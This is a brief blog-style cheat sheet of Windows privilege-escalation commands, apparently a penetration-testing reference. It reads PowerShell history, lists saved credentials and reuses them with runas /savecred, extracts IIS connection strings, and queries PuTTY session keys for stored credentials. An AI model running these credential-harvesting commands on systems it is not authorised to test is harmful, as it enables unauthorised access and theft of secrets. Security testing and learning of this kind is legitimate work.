---
title: "Windows Privilege Escalation Commands"
date: 2023-03-21T22:45:37+11:00
draft: false
tags: [ "Windows", "Privilege Escalation"]
categories: ["Tech"]
---

## Poweshell History
`type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`

## Saved Windows Credentials

`cmdkey /list`

`runas /savecred /user:admin cmd.exe`

## IIS Config

`type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString`

## Retrieve Credentials from Software: PuTTY

`reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s`

